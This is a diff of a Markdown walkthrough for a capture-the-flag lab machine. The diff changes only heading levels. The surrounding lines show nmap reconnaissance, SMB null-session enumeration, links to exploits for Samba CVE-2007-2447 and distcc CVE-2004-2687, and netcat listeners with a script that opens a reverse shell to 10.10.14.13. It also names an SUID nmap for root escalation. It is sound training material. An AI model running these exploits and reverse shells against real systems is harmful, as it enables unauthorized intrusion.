@@ -2,7 +2,7 @@
 
 <code>#CVE-2004-2687</code> <code>#CVE-2007-2447</code> <code>#CVE-2011-2523</code> <code>#vsFTPd</code> <code>#smbd</code> <code>#nmap</code>
 
-#### Reconnaissance
+## Reconnaissance
 
 `nmap -sC -sV -p- -Pn 10.10.10.3`
 
@@ -54,9 +54,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 199.67 seconds
 ```
 
-#### Enumeration
+## Enumeration
 
-###### Port 22 - File Transfer Protocol
+### Port 22 - File Transfer Protocol
 - Anonymous login using:
 	- ftp : ftp
 	- anonymous : anonymous
@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 199.67 seconds
 	- opens shell on port 6200/tcp
 	- Exploit was not successful
 
-##### Port 139, 445 - Server Message Block
+### Port 139, 445 - Server Message Block
 - Null Session
 	 `rpcclient 10.10.10.3 -U '' -N`
 
@@ -151,14 +151,14 @@ user:[uucp] rid:[0x3fc]
 	- CVE-2007-2447 - Arbitrary Code Execution
 		- [Exploit Github Repository](https://github.com/amriunix/CVE-2007-2447)
 
-##### Port 3632 - DistCC Daemon
+### Port 3632 - DistCC Daemon
 - Distcc is designed to speed up compilation by taking advantage of unused processing power on other computers. A machine with distcc installed can send code to be compiled across the network to a computer which has the distccd daemon and a compatible compiler installed.
 - CVE-2004-2687
 	- [Exploit Github Repository](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)
 
-#### Exploitation
+## Exploitation
 
-##### Exploitation #1: CVE-2007-2447
+### Exploitation #1: CVE-2007-2447
 `kali@kali:/$ nc -lvnp 3333`
 
 `kali@kali:/$ ./usermap_script.py 10.10.10.3 139 10.10.14.13 3333`
@@ -166,7 +166,7 @@ user:[uucp] rid:[0x3fc]
 <img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.36.35 PM.png" width=50% height=50%>
 <img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.37.01 PM.png" width=50% height=50%>
 
-##### Exploitation #2: CVE-2004-2687
+### Exploitation #2: CVE-2004-2687
 
 `kali@kali:/$ nc -lvnp 1337`
 
@@ -175,7 +175,7 @@ user:[uucp] rid:[0x3fc]
 <img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.50.26 PM.png" width=50% height=50%>
 <img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.51.21 PM.png" width=50% height=50%>
 
-##### Privilege Escalation w/ Exploitation #2
+### Privilege Escalation w/ Exploitation #2
 
 Important SUID files:
 `-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap`
